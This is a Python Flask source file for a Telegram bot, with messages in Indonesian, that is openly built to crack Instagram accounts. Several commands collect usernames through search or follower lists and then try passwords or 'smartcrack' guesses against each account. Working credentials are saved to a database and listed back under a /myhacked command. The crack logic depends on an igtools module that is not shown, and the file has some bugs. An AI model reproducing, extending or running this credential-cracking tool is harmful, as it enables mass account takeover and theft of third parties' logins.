import igtools
from flask import Flask,request
from requests import get
import os
import database

token = os.environ['TOKEN']
url = 'https://api.telegram.org/bot%s/' % token


otakBot = Flask(__name__)
xxx='klik /myhacked untuk melihat akun yg sudah terambil'
xx='harap tunggu'
def update(update):
	global id,np
	id = update['message']['chat']['id']
	try:
		np = update['message']['from']['username']
	except:
		np = update['message']['from']['first_name']
	tek = update['message']['text']
	cm = tek.split(' ')
	if 'new_chat_member' in str(update):
		nama_grup = update['message']['chat']['title']
		grup_id   = update['message']['chat']['id']
		mem_baru  = update['message']['new_chat_member']['first_name']
		teks      = 'Hai %s !\nSelamat datang di Grup %s' %(mem_baru,nama_grup)
		kirim_pesan(grup_id,teks)
	elif cm[0] == '/search':
		x=igtools.search(cm[1])
		f=str(x).replace('\'','\n').replace(',','')
		kirim_pesan(id,f)
	elif cm[0] == '/listfollower':
		x=igtools.get_followers(cm[1])
		f=str(x).replace('\'','\n').replace(',','')
		kirim_pesan(id,f)
	elif cm[0] == '/followersmartcrack':
		kirim_pesan(id,xxx+'\n'+xx)
		for i in igtools.get_followets(cm[1]):
			ooo=database.mysql(id, igtools.smartcrack(i))
			ooo.insert()
	elif cm[0] == '/searchsmartcrack':
		kirim_pesan(id,xxx+'\n'+xx)
		for i in igtools.search(cm[1]):
			ooo=database.mysql(id, igtools.smartcrack(i), np)
			ooo.insert()
	elif cm[0] == '/searchcrack':
		kirim_pesan(id,xxx+'\n'+xx)
		for i in igtools.search(cm[1]):
			if igtools.login(i,cm[2]) == True:
				ooo=database.mysql(id,'username : %s\npassword : %s\n\n'%(i,cm[2]))
				ooo.insert()
			else:
				return 0
	elif cm[0] == '/crackfollower':
		kirim_pesan(id,xxx+'\n'+xx)
		for i in igtools.get_followers(cm[1]):
			if igtools.login(i,cm[2]) == True:
				ooo=database.mysql(id,'username : %s\npassword : %s\n\n'%(id,cm[1]))
			else:
				return 0
	elif cm[0] == '/myhacked':
		kirim_pesan(id, database.mysql(id, '', np).mylog())
     # disini bisa kita tambahin kode lainnya
     # misalnya membalas kalau ada oran yang ngechat ke bot kita 
     # dan kreasikan sesuai imajinasi kalian :)
	elif cm[0] == '/start':
		o=database.mysql(id,'',np)
		o.user()
	elif ( cm[0] == '/start' or cm[0] == '/help' ):
		kirim_pesan(id,'perintah :\n/crackfollower <username> <password>\n/search <username>\n/searchcrack <username> <password>\n/followersmartcrack <username>\n/listfollower <username>\n/searchsmartcrack <username>\nadmin : @krypton_bytes & @krypton_byte')
	else:
		kirim_pesan(id,'perintah tidak ada klik /help untuk melihat perintah')
def kirim_pesan(id,teks):
	data = {
		'chat_id':id,
		'text':'@%s' % np+' result:\n%s' %teks
	}
	get(url+'sendMessage',params=data)


@otakBot.route('/',methods=['POST','GET'])
def index():
	if request.method == 'POST':
		data_update = request.get_json()
		update(data_update)
		return "oke"
	else:
		return 'LAST VERSION'

if __name__ == '__main__':
	otakBot.run(host='0.0.0.0',port=int(os.environ.get('PORT','5000')),debug=True)
